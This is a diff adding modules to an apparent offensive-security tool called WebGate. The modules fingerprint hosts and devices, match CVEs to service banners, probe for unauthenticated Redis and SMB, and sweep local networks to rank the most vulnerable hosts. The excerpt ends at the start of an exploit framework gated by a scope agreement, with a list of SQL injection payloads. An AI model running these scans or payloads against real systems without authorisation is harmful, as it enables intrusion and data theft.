+</table>
+</div>
+
+<div class="footer">WebGate v4.0 &middot; by c3less &middot; github.com/c3less/webgate</div>
+</div>
+</body>
+</html>"""
+            with open(html_fn, "w", encoding="utf-8") as f:
+                f.write(html)
+            self._log(f"  HTML report: {html_fn}", "FOUND")
+        except Exception as e:
+            self._log(f"  HTML report failed: {e}", "WARN")
 
     def _build_risks(self) -> list:
         risks = []; s = self.results.get("ssl", {})
@@ -1113,13 +1579,18 @@ class DomainScanner:
                 risks.append(("CRITICAL", f"{len(po['cves'])} CVE(s) for {po['service']} on :{po['port']}"))
         return risks
 
-    def run(self) -> str | None:
+    def run(self, include_subs=False) -> str | None:
         self.start_time = time.time()
         self._log(f"Starting audit: {self.domain}", "INFO")
         self._log("─" * 52, "INFO")
-        for step in [self.resolve_dns, self.check_dns_records, self.get_whois,
-                     self.analyze_http_headers, self.check_ssl, self.scan_ports,
-                     self.generate_report]:
+        steps = [
+            self.resolve_dns, self.check_dns_records, self.get_whois,
+            self.analyze_http_headers, self.detect_waf, self.check_ssl,
+            self.scan_ports, self.generate_report,
+        ]
+        if include_subs:
+            steps.insert(7, self.enumerate_subdomains)
+        for step in steps:
             if self.cancelled:
                 self._log("Cancelled.", "WARN"); return None
             try:
@@ -1607,6 +2078,1343 @@ class DeepScanner:
 
         self._log("Deep scan finished.", "SUCCESS")
         self._prog(100)
+
+
+# ═══════════════════════════════════════════════════════════════
+# SERVICE FINGERPRINTER — Detect OS, router, CMS, tech stack
+# ═══════════════════════════════════════════════════════════════
+class ServiceFingerprinter:
+    """Identifies what a host is: router, server OS, CMS, IoT device, etc."""
+
+    ROUTER_SIGNATURES = {
+        "mikrotik":    "MikroTik RouterOS",
+        "routeros":    "MikroTik RouterOS",
+        "dd-wrt":      "DD-WRT Router",
+        "openwrt":     "OpenWrt Router",
+        "tomato":      "Tomato Firmware",
+        "ubnt":        "Ubiquiti EdgeRouter",
+        "edgeos":      "Ubiquiti EdgeOS",
+        "cisco":       "Cisco IOS",
+        "juniper":     "Juniper JunOS",
+        "fortigate":   "Fortinet FortiGate",
+        "pfsense":     "pfSense Firewall",
+        "opnsense":    "OPNsense Firewall",
+        "zyxel":       "ZyXEL Router",
+        "netgear":     "NETGEAR Router",
+        "tp-link":     "TP-Link Router",
+        "asus":        "ASUS Router",
+        "d-link":      "D-Link Router",
+        "linksys":     "Linksys Router",
+        "huawei":      "Huawei Router",
+        "keenetic":    "Keenetic Router",
+        "synology":    "Synology NAS",
+        "qnap":        "QNAP NAS",
+        "hikvision":   "Hikvision Camera",
+        "dahua":       "Dahua Camera",
+        "axis":        "Axis Camera",
+    }
+
+    CMS_SIGNATURES = {
+        "wordpress":   "WordPress",
+        "wp-content":  "WordPress",
+        "wp-json":     "WordPress",
+        "joomla":      "Joomla",
+        "drupal":      "Drupal",
+        "bitrix":      "1C-Bitrix",
+        "modx":        "MODX",
+        "opencart":    "OpenCart",
+        "magento":     "Magento",
+        "shopify":     "Shopify",
+        "wix.com":     "Wix",
+        "squarespace": "Squarespace",
+        "ghost":       "Ghost CMS",
+        "typo3":       "TYPO3",
+        "prestashop":  "PrestaShop",
+        "laravel":     "Laravel",
+        "django":      "Django",
+        "flask":       "Flask",
+        "express":     "Express.js",
+        "next.js":     "Next.js",
+        "nuxt":        "Nuxt.js",
+    }
+
+    OS_SIGNATURES = {
+        "ubuntu":      "Ubuntu Linux",
+        "debian":      "Debian Linux",
+        "centos":      "CentOS Linux",
+        "red hat":     "Red Hat Enterprise Linux",
+        "fedora":      "Fedora Linux",
+        "freebsd":     "FreeBSD",
+        "openbsd":     "OpenBSD",
+        "windows":     "Microsoft Windows",
+        "win32":       "Microsoft Windows",
+        "win64":       "Microsoft Windows",
+        "iis":         "Microsoft Windows (IIS)",
+        "darwin":      "macOS",
+    }
+
+    def __init__(self, domain, log_cb=None):
+        self.domain = domain
+        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
+        self.result = {
+            "device_type": "unknown",
+            "os": "unknown",
+            "cms": [],
+            "server_software": "unknown",
+            "technologies": [],
+            "is_router": False,
+            "is_iot": False,
+            "is_nas": False,
+        }
+
+    def _log(self, msg, level="INFO"):
+        self.log_cb(msg, level)
+
+    def fingerprint(self) -> dict:
+        self._log("Fingerprinting target device/server...", "STEP")
+
+        # 1) HTTP banner + headers
+        headers_data = self._grab_http()
+
+        # 2) Banner grabbing on key ports
+        self._grab_banners()
+
+        # 3) TTL-based OS detection
+        self._ttl_detect()
+
+        # 4) Nmap OS detection if available
+        self._nmap_os_detect()
+
+        # Summary
+        dtype = self.result["device_type"]
+        osys = self.result["os"]
+        cms_list = ", ".join(self.result["cms"]) if self.result["cms"] else "none"
+        self._log(f"  Device type     : {dtype}", "FOUND")
+        self._log(f"  OS              : {osys}", "FOUND")
+        self._log(f"  CMS             : {cms_list}", "FOUND")
+        if self.result["technologies"]:
+            self._log(f"  Technologies    : {', '.join(self.result['technologies'][:5])}", "FOUND")
+
+        return self.result
+
+    def _grab_http(self):
+        for proto in ("https", "http"):
+            try:
+                url = f"{proto}://{self.domain}"
+                req = Request(url, headers={
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                })
+                with urlopen(req, timeout=8) as resp:
+                    headers = dict(resp.headers)
+                    body = resp.read(8192).decode("utf-8", errors="ignore").lower()
+
+                    # Server header
+                    server = headers.get("Server", "").lower()
+                    self.result["server_software"] = headers.get("Server", "unknown")
+
+                    # X-Powered-By
+                    powered = headers.get("X-Powered-By", "").lower()
+                    if powered:
+                        self.result["technologies"].append(f"X-Powered-By: {headers.get('X-Powered-By','')}")
+
+                    # Check for router signatures
+                    combined = server + " " + body + " " + powered
+                    for sig, name in self.ROUTER_SIGNATURES.items():
+                        if sig in combined:
+                            self.result["device_type"] = "router/firewall"
+                            self.result["is_router"] = True
+                            self.result["technologies"].append(name)
+                            self._log(f"  [FP] Router detected: {name}", "WARN")
+                            break
+
+                    # Check for NAS
+                    if any(x in combined for x in ["synology", "qnap", "nas", "diskstation"]):
+                        self.result["device_type"] = "NAS"
+                        self.result["is_nas"] = True
+
+                    # Check for IoT/Camera
+                    if any(x in combined for x in ["hikvision", "dahua", "axis", "camera", "dvr", "nvr"]):
+                        self.result["device_type"] = "IoT/Camera"
+                        self.result["is_iot"] = True
+
+                    # Check CMS
+                    for sig, name in self.CMS_SIGNATURES.items():
+                        if sig in combined:
+                            if name not in self.result["cms"]:
+                                self.result["cms"].append(name)
+
+                    # OS from Server header
+                    for sig, name in self.OS_SIGNATURES.items():
+                        if sig in server:
+                            self.result["os"] = name
+                            break
+
+                    # Detect web technologies from headers/body
+                    if "x-aspnet-version" in str(headers).lower():
+                        self.result["technologies"].append("ASP.NET")
+                        if self.result["os"] == "unknown":
+                            self.result["os"] = "Microsoft Windows"
+                    if "php" in combined:
+                        self.result["technologies"].append("PHP")
+                    if "x-generator" in str(headers).lower():
+                        self.result["technologies"].append(f"Generator: {headers.get('X-Generator','')}")
+
+                    if self.result["device_type"] == "unknown":
+                        self.result["device_type"] = "web server"
+
+                    return headers
+            except Exception:
+                continue
+        return {}
+
+    def _grab_banners(self):
+        try:
+            ip = socket.gethostbyname(self.domain)
+        except:
+            return
+
+        banner_ports = {22: "SSH", 21: "FTP", 23: "Telnet", 25: "SMTP",
+                        8291: "MikroTik-API", 8728: "MikroTik-API",
+                        8080: "HTTP-Alt", 161: "SNMP"}
+        for port, svc in banner_ports.items():
+            try:
+                s = socket.socket(); s.settimeout(1.5)
+                s.connect((ip, port))
+                if port in (80, 8080):
+                    s.send(b"HEAD / HTTP/1.0\r\nHost: " + self.domain.encode() + b"\r\n\r\n")
+                banner = s.recv(256).decode("utf-8", errors="ignore").strip().lower()
+                s.close()
+                if not banner:
+                    continue
+
+                # Check SSH banner for OS
+                if port == 22:
+                    if "ubuntu" in banner:
+                        self.result["os"] = "Ubuntu Linux"
+                    elif "debian" in banner:
+                        self.result["os"] = "Debian Linux"
+                    self.result["technologies"].append(f"SSH: {banner[:60]}")
+
+                # Check for router indicators
+                for sig, name in self.ROUTER_SIGNATURES.items():
+                    if sig in banner:
+                        self.result["device_type"] = "router/firewall"
+                        self.result["is_router"] = True
+                        self.result["technologies"].append(name)
+                        self._log(f"  [FP] Router via port {port}: {name}", "WARN")
+                        break
+            except:
+                continue
+
+    def _ttl_detect(self):
+        """Detect OS based on default TTL values."""
+        if self.result["os"] != "unknown":
+            return
+        try:
+            ip = socket.gethostbyname(self.domain)
+            result = subprocess.run(
+                ["ping", "-c", "1", "-W", "2", ip],
+                capture_output=True, text=True, timeout=5
+            )
+            ttl_match = re.search(r'ttl[=:](\d+)', result.stdout.lower())
+            if ttl_match:
+                ttl = int(ttl_match.group(1))
+                if ttl <= 64:
+                    self.result["os"] = "Linux/Unix (TTL<=64)"
+                elif ttl <= 128:
+                    self.result["os"] = "Windows (TTL<=128)"
+                elif ttl <= 255:
+                    self.result["os"] = "Network device (TTL<=255)"
+                self._log(f"  [FP] TTL={ttl} → {self.result['os']}", "INFO")
+        except:
+            pass
+
+    def _nmap_os_detect(self):
+        """Try nmap OS detection if available (needs root)."""
+        if self.result["os"] != "unknown" and "TTL" not in self.result["os"]:
+            return
+        try:
+            result = subprocess.run(
+                ["nmap", "-O", "--osscan-guess", "-T4", self.domain],
+                capture_output=True, text=True, timeout=30
+            )
+            for line in result.stdout.split("\n"):
+                if "running:" in line.lower() or "os details:" in line.lower():
+                    os_info = line.split(":", 1)[1].strip()
+                    self.result["os"] = os_info
+                    self._log(f"  [FP] Nmap OS: {os_info}", "FOUND")
+                    break
+        except:
+            pass
+
+
+# ═══════════════════════════════════════════════════════════════
+# CVE VERIFIER — Check if CVE is actually exploitable (no exploit)
+# ═══════════════════════════════════════════════════════════════
+class CVEVerifier:
+    """Verifies if discovered CVEs are potentially valid for the target.
+    Does NOT exploit — only checks version/config indicators."""
+
+    def __init__(self, domain, open_ports, log_cb=None):
+        self.domain = domain
+        self.open_ports = open_ports  # list of {"port":N, "service":"X", "banner":"Y", "cves":[...]}
+        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
+        self.verified = []
+
+    def _log(self, msg, level="INFO"):
+        self.log_cb(msg, level)
+
+    def verify_all(self) -> list:
+        self._log("Verifying CVE applicability on open ports...", "STEP")
+        for port_info in self.open_ports:
+            port = port_info["port"]
+            service = port_info["service"]
+            banner = port_info.get("banner", "")
+            cves = port_info.get("cves", [])
+
+            if not cves:
+                continue
+
+            self._log(f"  Checking {service} on port {port} ({len(cves)} CVE candidates)...", "INFO")
+
+            for cve_id, desc in cves:
+                status = self._verify_single(port, service, banner, cve_id, desc)
+                self.verified.append({
+                    "port": port,
+                    "service": service,
+                    "cve_id": cve_id,
+                    "description": desc,
+                    "status": status,
+                })
+                color = "ERROR" if status == "LIKELY" else ("WARN" if status == "POSSIBLE" else "INFO")
+                self._log(f"    {cve_id}: {status} — {desc[:50]}", color)
+
+        likely_count = sum(1 for v in self.verified if v["status"] == "LIKELY")
+        possible_count = sum(1 for v in self.verified if v["status"] == "POSSIBLE")
+        self._log(f"  CVE verification: {likely_count} LIKELY, {possible_count} POSSIBLE, "
+                  f"{len(self.verified) - likely_count - possible_count} UNLIKELY", "INFO")
+        return self.verified
+
+    def _verify_single(self, port, service, banner, cve_id, desc) -> str:
+        """Check if a specific CVE might apply. Returns LIKELY/POSSIBLE/UNLIKELY."""
+        banner_low = banner.lower()
+        desc_low = desc.lower()
+
+        # Version-based checks
+        version_match = re.search(r'(\d+\.\d+[\.\d]*)', banner)
+        if version_match:
+            version = version_match.group(1)
+            # Check if CVE description mentions specific versions
+            if version in desc:
+                return "LIKELY"
+
+        # Service-specific verification
+        if service.lower() == "ssh" and "openssh" in banner_low:
+            return self._verify_ssh(banner_low, cve_id)
+        if service.lower() in ("http", "https", "http-alt"):
+            return self._verify_http(port, cve_id, desc_low)
+        if service.lower() == "ftp":
+            return self._verify_ftp(banner_low, cve_id)
+        if service.lower() in ("mysql", "mariadb", "postgresql"):
+            return self._verify_db(port, banner_low, cve_id)
+        if service.lower() == "smb":
+            return self._verify_smb(port, cve_id)
+        if service.lower() == "redis":
+            return self._verify_redis(port, cve_id)
+
+        # Generic: if banner mentions service name in CVE, it's possible
+        svc_in_cve = service.lower().replace("-", "")
+        if svc_in_cve in desc_low:
+            return "POSSIBLE"
+
+        return "UNLIKELY"
+
+    def _verify_ssh(self, banner, cve_id) -> str:
+        ver_match = re.search(r'openssh[_\s]*(\d+\.\d+)', banner)
+        if not ver_match:
+            return "POSSIBLE"
+        ver = float(ver_match.group(1))
+        vuln_map = {
+            "CVE-2023-38408": ver < 9.4,
+            "CVE-2023-25136": ver < 9.2,
+            "CVE-2021-28041": ver < 8.5,
+            "CVE-2019-6111": ver < 8.0,
+            "CVE-2018-15473": ver < 7.8,
+            "CVE-2016-10009": ver < 7.4,
+        }
+        if cve_id in vuln_map:
+            return "LIKELY" if vuln_map[cve_id] else "UNLIKELY"
+        return "POSSIBLE"
+
+    def _verify_http(self, port, cve_id, desc) -> str:
+        """Check HTTP-related CVEs by probing headers."""
+        try:
+            proto = "https" if port == 443 else "http"
+            url = f"{proto}://{self.domain}:{port}/"
+            req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/4.0)"})
+            with urlopen(req, timeout=5) as resp:
+                server = resp.headers.get("Server", "").lower()
+                powered = resp.headers.get("X-Powered-By", "").lower()
+
+                # Apache version check
+                if "apache" in server and "apache" in desc:
+                    ver_m = re.search(r'apache/(\d+\.\d+\.\d+)', server)
+                    if ver_m:
+                        ver = ver_m.group(1)
+                        if "2.4.49" in desc and ver == "2.4.49":
+                            return "LIKELY"
+                        if "2.4.50" in desc and ver == "2.4.50":
+                            return "LIKELY"
+                    return "POSSIBLE"
+
+                # nginx version check
+                if "nginx" in server and "nginx" in desc:
+                    return "POSSIBLE"
+
+                # Log4Shell check (Java apps)
+                if "log4" in desc:
+                    if any(x in server + powered for x in ["java", "tomcat", "spring", "jetty"]):
+                        return "LIKELY"
+
+                return "POSSIBLE"
+        except:
+            return "POSSIBLE"
+
+    def _verify_ftp(self, banner, cve_id) -> str:
+        if "vsftpd 2.3.4" in banner and "CVE-2011-4130" in cve_id:
+            return "LIKELY"
+        if "proftpd" in banner and "proftpd" in cve_id.lower():
+            return "POSSIBLE"
+        return "UNLIKELY"
+
+    def _verify_db(self, port, banner, cve_id) -> str:
+        """Check if DB port accepts unauthenticated connections."""
+        try:
+            s = socket.socket(); s.settimeout(3)
+            s.connect((self.domain, port))
+            data = s.recv(256).decode("utf-8", errors="ignore").lower()
+            s.close()
+            if data:
+                return "POSSIBLE"
+        except:
+            pass
+        return "UNLIKELY"
+
+    def _verify_smb(self, port, cve_id) -> str:
+        """Basic SMB version probe."""
+        try:
+            s = socket.socket(); s.settimeout(3)
+            s.connect((self.domain, port))
+            # SMB negotiate
+            s.send(b'\x00\x00\x00\x85\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+                   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+            resp = s.recv(256)
+            s.close()
+            if resp and b'SMB' in resp:
+                return "POSSIBLE"
+        except:
+            pass
+        return "UNLIKELY"
+
+    def _verify_redis(self, port, cve_id) -> str:
+        """Check if Redis is unauthenticated."""
+        try:
+            s = socket.socket(); s.settimeout(3)
+            s.connect((self.domain, port))
+            s.send(b"PING\r\n")
+            resp = s.recv(64).decode("utf-8", errors="ignore")
+            s.close()
+            if "+PONG" in resp:
+                self._log(f"    [!] Redis on :{port} accepts unauthenticated commands!", "ERROR")
+                return "LIKELY"
+        except:
+            pass
+        return "UNLIKELY"
+
+
+# ═══════════════════════════════════════════════════════════════
+# NETWORK AGENT — Scan entire local network, find most vulnerable
+# ═══════════════════════════════════════════════════════════════
+class NetworkAgent:
+    """Discovers all hosts on the local network, scans each briefly,
+    and ranks them by vulnerability score."""
+
+    QUICK_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389,
+                   5432, 5900, 6379, 8080, 8443, 8888, 9200, 27017]
+
+    def __init__(self, log_cb=None, prog_cb=None):
+        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
+        self.prog_cb = prog_cb or (lambda v: None)
+        self.hosts = []
+        self.cancelled = False
+
+    def _log(self, msg, level="INFO"):
+        self.log_cb(msg, level)
+
+    def _prog(self, v):
+        self.prog_cb(min(100, max(0, int(v))))
+
+    def get_local_networks(self) -> list:
+        """Detect local network ranges."""
+        networks = []
+
+        # Method 1: netifaces
+        if NETIFACES_OK:
+            try:
+                for iface in netifaces.interfaces():
+                    addrs = netifaces.ifaddresses(iface)
+                    if netifaces.AF_INET in addrs:
+                        for addr in addrs[netifaces.AF_INET]:
+                            ip = addr.get("addr", "")
+                            mask = addr.get("netmask", "255.255.255.0")
+                            if ip and not ip.startswith("127."):
+                                try:
+                                    net = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
+                                    networks.append(str(net))
+                                except:
+                                    pass
+            except:
+                pass
+
+        # Method 2: ip route (Linux/Termux)
+        if not networks:
+            try:
+                result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
+                for line in result.stdout.split("\n"):
+                    if "src" in line and "default" not in line:
+                        parts = line.split()
+                        if parts and "/" in parts[0]:
+                            networks.append(parts[0])
+            except:
+                pass
+
+        # Method 3: ifconfig fallback
+        if not networks:
+            try:
+                result = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=5)
+                for match in re.finditer(r'inet\s+(\d+\.\d+\.\d+\.\d+)', result.stdout):
+                    ip = match.group(1)
+                    if not ip.startswith("127."):
+                        net = str(ipaddress.IPv4Network(f"{ip}/24", strict=False))
+                        networks.append(net)
+            except:
+                pass
+
+        # Fallback
+        if not networks:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                local_ip = s.getsockname()[0]
+                s.close()
+                net = str(ipaddress.IPv4Network(f"{local_ip}/24", strict=False))
+                networks.append(net)
+            except:
+                networks.append("192.168.1.0/24")
+
+        return list(set(networks))
+
+    def discover_hosts(self, network: str) -> list:
+        """Discover live hosts using ARP ping or TCP connect."""
+        self._log(f"Discovering hosts on {network}...", "STEP")
+        live = []
+
+        try:
+            net = ipaddress.IPv4Network(network, strict=False)
+            hosts = list(net.hosts())
+
+            # Limit to /24 for sanity
+            if len(hosts) > 254:
+                self._log(f"  Network too large ({len(hosts)} hosts), limiting to /24", "WARN")
+                hosts = hosts[:254]
+
+            total = len(hosts)
+            self._log(f"  Scanning {total} potential hosts...", "INFO")
+
+            def check_host(ip_str):
+                if self.cancelled:
+                    return None
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.5)
+                    # Try common ports for host discovery
+                    for port in [80, 443, 22, 445, 8080]:
+                        if s.connect_ex((ip_str, port)) == 0:
+                            s.close()
+                            return ip_str
+                    s.close()
+                except:
+                    pass
+                # Try ICMP (ping)
+                try:
+                    result = subprocess.run(
+                        ["ping", "-c", "1", "-W", "1", ip_str],
+                        capture_output=True, timeout=2
+                    )
+                    if result.returncode == 0:
+                        return ip_str
+                except:
+                    pass
+                return None
+
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                futures = {executor.submit(check_host, str(ip)): str(ip) for ip in hosts}
+                done_count = 0
+                for future in as_completed(futures):
+                    done_count += 1
+                    if done_count % 20 == 0:
+                        self._prog(int(done_count / total * 30))
+                    result = future.result()
+                    if result:
+                        live.append(result)
+                        try:
+                            hostname = socket.gethostbyaddr(result)[0]
+                        except:
+                            hostname = ""
+                        self._log(f"  [ALIVE] {result} {('(' + hostname + ')') if hostname else ''}", "FOUND")
+
+        except Exception as e:
+            self._log(f"  Discovery error: {e}", "ERROR")
+
+        self._log(f"  Found {len(live)} live hosts", "INFO")
+        return live
+
+    def quick_scan_host(self, ip: str) -> dict:
+        """Quick vulnerability assessment of a single host."""
+        result = {
+            "ip": ip,
+            "hostname": "",
+            "open_ports": [],
+            "services": [],
+            "vulns": 0,
+            "score": 0,
+            "device_type": "unknown",
+            "os_guess": "unknown",
+            "cves": [],
+        }
+
+        try:
+            result["hostname"] = socket.gethostbyaddr(ip)[0]
+        except:
+            pass
+
+        # Port scan
+        for port in self.QUICK_PORTS:
+            if self.cancelled:
+                break
+            try:
+                s = socket.socket(); s.settimeout(0.8)
+                if s.connect_ex((ip, port)) == 0:
+                    svc_name = self._identify_service(port)
+                    banner = ""
+                    try:
+                        if port in (80, 8080):
+                            s.send(b"HEAD / HTTP/1.0\r\n\r\n")
+                        data = s.recv(256).decode("utf-8", errors="ignore").strip()
+                        banner = data[:100]
+                    except:
+                        pass
+                    s.close()
+
+                    result["open_ports"].append(port)
+                    result["services"].append({"port": port, "service": svc_name, "banner": banner})
+
+                    # CVE lookup
+                    cves = query_cve(svc_name.lower())
+                    result["cves"].extend([(cve_id, desc, port) for cve_id, desc in cves])
+                    result["vulns"] += len(cves)
+                else:
+                    s.close()
+            except:
+                pass
+
+        # Calculate vulnerability score
+        score = 0
+        dangerous_ports = {23, 21, 445, 3389, 5900}  # Telnet, FTP, SMB, RDP, VNC
+        exposed_dbs = {3306, 5432, 6379, 27017, 9200}  # MySQL, PG, Redis, Mongo, ES
+
+        for p in result["open_ports"]:
+            if p in dangerous_ports:
+                score += 30
+            elif p in exposed_dbs:
+                score += 25
+            else:
+                score += 5
+
+        score += result["vulns"] * 3
+
+        # Banner-based fingerprinting
+        all_banners = " ".join(s.get("banner", "") for s in result["services"]).lower()
+        for sig, name in ServiceFingerprinter.ROUTER_SIGNATURES.items():
+            if sig in all_banners:
+                result["device_type"] = "router"
+                result["os_guess"] = name
+                score += 20  # Routers are often vulnerable
+                break
+
+        # TTL-based OS
+        try:
+            r = subprocess.run(["ping", "-c", "1", "-W", "1", ip],
+                              capture_output=True, text=True, timeout=3)
+            ttl_m = re.search(r'ttl[=:](\d+)', r.stdout.lower())
+            if ttl_m:
+                ttl = int(ttl_m.group(1))
+                if ttl <= 64:
+                    result["os_guess"] = "Linux/Unix"
+                elif ttl <= 128:
+                    result["os_guess"] = "Windows"
+                elif ttl <= 255:
+                    result["os_guess"] = "Network Device"
+        except:
+            pass
+
+        result["score"] = min(100, score)
+        return result
+
+    def _identify_service(self, port: int) -> str:
+        services = {
+            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+            80: "HTTP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
+            3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
+            8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Dev",
+            9200: "Elasticsearch", 27017: "MongoDB",
+        }
+        return services.get(port, f"port-{port}")
+
+    def run(self) -> dict:
+        """Full agent scan: discover network, scan all hosts, rank by vulnerability."""
+        self._log("=" * 56, "INFO")
+        self._log("NETWORK AGENT MODE — Local Network Assessment", "STEP")
+        self._log("=" * 56, "INFO")
+
+        networks = self.get_local_networks()
+        self._log(f"Detected networks: {', '.join(networks)}", "INFO")
+        self._prog(5)
+
+        all_hosts = []
+        for net in networks:
+            if self.cancelled:
+                break
+            hosts = self.discover_hosts(net)
+            all_hosts.extend(hosts)
+
+        self._prog(30)
+
+        if not all_hosts:
+            self._log("No live hosts found on the network.", "WARN")
+            return {"hosts": [], "most_vulnerable": None}
+
+        # Scan each host
+        self._log(f"\nScanning {len(all_hosts)} discovered hosts...", "STEP")
+        self._log("─" * 56, "INFO")
+        scanned = []
+        for i, ip in enumerate(all_hosts):
+            if self.cancelled:
+                break
+            self._log(f"\n  [{i+1}/{len(all_hosts)}] Scanning {ip}...", "STEP")
+            host_result = self.quick_scan_host(ip)
+            scanned.append(host_result)
+
+            ports_str = ", ".join(str(p) for p in host_result["open_ports"][:8])
+            self._log(f"    Ports: {ports_str or 'none'}", "INFO")
+            self._log(f"    Type: {host_result['device_type']} | OS: {host_result['os_guess']}", "INFO")
+            self._log(f"    Vuln Score: {host_result['score']}/100 ({host_result['vulns']} CVEs)", "FOUND")
+
+            self._prog(30 + int((i + 1) / len(all_hosts) * 60))
+
+        # Rank by vulnerability score
+        scanned.sort(key=lambda h: h["score"], reverse=True)
+
+        self._log("\n" + "=" * 56, "INFO")
+        self._log("NETWORK ASSESSMENT RESULTS", "STEP")
+        self._log("=" * 56, "INFO")
+
+        for i, host in enumerate(scanned[:10]):
+            risk = "CRITICAL" if host["score"] >= 70 else ("HIGH" if host["score"] >= 40 else
+                    ("MEDIUM" if host["score"] >= 20 else "LOW"))
+            self._log(
+                f"  #{i+1}  {host['ip']:<16} Score:{host['score']:>3}/100  "
+                f"[{risk}]  Ports:{len(host['open_ports'])}  CVEs:{host['vulns']}  "
+                f"({host['os_guess']})",
+                "ERROR" if risk in ("CRITICAL", "HIGH") else "WARN" if risk == "MEDIUM" else "INFO"
+            )
+
+        most_vuln = scanned[0] if scanned else None
+        if most_vuln and most_vuln["score"] > 0:
+            self._log(f"\n  Most vulnerable: {most_vuln['ip']} (score {most_vuln['score']})", "ERROR")
+            if most_vuln["cves"]:
+                self._log("  Top CVEs:", "WARN")
+                seen = set()
+                for cve_id, desc, port in most_vuln["cves"][:5]:
+                    if cve_id not in seen:
+                        seen.add(cve_id)
+                        self._log(f"    {cve_id} (port {port}): {desc[:50]}", "WARN")
+
+        self._prog(100)
+        return {"hosts": scanned, "most_vulnerable": most_vuln}
+
+
+# ═══════════════════════════════════════════════════════════════
+# EXPLOIT FRAMEWORK — Only with Scope Agreement
+# ═══════════════════════════════════════════════════════════════
+SCOPE_AGREEMENT_TEXT = """
+╔══════════════════════════════════════════════════════════════════╗
+║              SCOPE AGREEMENT — EXPLOIT MODE                      ║
+╠══════════════════════════════════════════════════════════════════╣
+║                                                                  ║
+║  You are about to activate EXPLOIT MODE.                         ║
+║  This mode enables ACTIVE exploitation capabilities:             ║
+║                                                                  ║
+║    • SQL Injection (SQLi) — data extraction, auth bypass         ║
+║    • Cross-Site Scripting (XSS) — reflected, stored, DOM         ║
+║    • Command Injection — OS command execution                    ║
+║    • File Upload — webshell upload attempts                      ║
+║    • Backdoor Deployment — reverse shell, bind shell             ║
+║    • Brute Force — credential guessing                           ║
+║    • Privilege Escalation — post-exploitation                    ║
+║                                                                  ║
+║  LEGAL REQUIREMENTS:                                             ║
+║                                                                  ║
+║    1. You MUST have a signed Scope Agreement / Authorization     ║
+║       document from the system owner                             ║
+║    2. You MUST only target systems explicitly listed in scope    ║
+║    3. Unauthorized access is a CRIMINAL OFFENSE under:           ║
+║       - CFAA (USA), CMA (UK), StGB §202a (DE)                   ║
+║       - and equivalent laws worldwide                            ║
+║    4. YOU bear FULL legal responsibility for your actions        ║
+║                                                                  ║
+║  ACCEPTABLE USE:                                                 ║
+║    ✓ Authorized penetration testing with signed scope            ║
+║    ✓ CTF competitions and lab environments                       ║
+║    ✓ Your own systems and infrastructure                         ║
+║                                                                  ║
+║  By typing 'Y' you confirm:                                     ║
+║    - You have written authorization (Scope Agreement)            ║
+║    - You accept full legal responsibility                        ║
+║    - You understand this is for AUTHORIZED TESTING ONLY          ║
+║                                                                  ║
+╚══════════════════════════════════════════════════════════════════╝
+"""
+
+
+class ExploitFramework:
+    """Active exploitation framework — requires scope agreement."""
+
+    def __init__(self, domain, log_cb=None, prog_cb=None):
+        self.domain = domain
+        self.log_cb = log_cb or (lambda m, l: print(f"[{l}] {m}"))
+        self.prog_cb = prog_cb or (lambda v: None)
+        self.results = {}
+        self.cancelled = False
+        self.session_id = hashlib.md5(f"{domain}{time.time()}".encode()).hexdigest()[:8]
+
+    def _log(self, msg, level="INFO"):
+        self.log_cb(msg, level)
+
+    def _prog(self, v):
+        self.prog_cb(min(100, max(0, int(v))))
+
+    def _http_get(self, url, timeout=8, headers=None):
+        hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        if headers:
+            hdrs.update(headers)
+        try:
+            req = Request(url, headers=hdrs)
+            with urlopen(req, timeout=timeout) as r:
+                return r.status, r.read(8192).decode("utf-8", errors="ignore"), dict(r.headers)
+        except HTTPError as e:
+            return e.code, "", dict(e.headers) if hasattr(e, "headers") else {}
+        except:
+            return 0, "", {}
+
+    def _http_post(self, url, data, timeout=8, content_type="application/x-www-form-urlencoded"):
+        try:
+            if isinstance(data, str):
+                data = data.encode()
+            req = Request(url, data=data, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                "Content-Type": content_type,
+            })
+            with urlopen(req, timeout=timeout) as r:
+                return r.status, r.read(8192).decode("utf-8", errors="ignore")
+        except HTTPError as e:
+            body = e.read(4096).decode("utf-8", errors="ignore") if hasattr(e, "read") else ""
+            return e.code, body
+        except:
+            return 0, ""
+
+    def run_sqli_exploit(self):
+        """Advanced SQL injection testing."""
+        self._log("=" * 50, "INFO")
+        self._log("[EXPLOIT] SQL Injection Testing", "STEP")
+        self._log("=" * 50, "INFO")
+
+        findings = []
+        base_url = f"http://{self.domain}"
+
+        # Error-based SQLi
+        self._log("  [SQLi] Testing error-based injection...", "INFO")
+        error_payloads = [
+            ("'", ["sql syntax", "mysql_fetch", "ORA-", "pg_query", "sqlite_",
+                   "unclosed quotation", "microsoft ole db", "odbc sql"]),
+            ("1 OR 1=1--", ["sql syntax", "you have an error"]),
+            ("' UNION SELECT NULL--", ["union", "column"]),
+            ("1; WAITFOR DELAY '0:0:5'--", []),  # Time-based
+            ("1' AND SLEEP(3)--", []),  # MySQL time-based
+            ("' OR '1'='1", ["sql", "error", "warning"]),
+            ("admin'--", ["sql", "error", "login"]),
+        ]
+
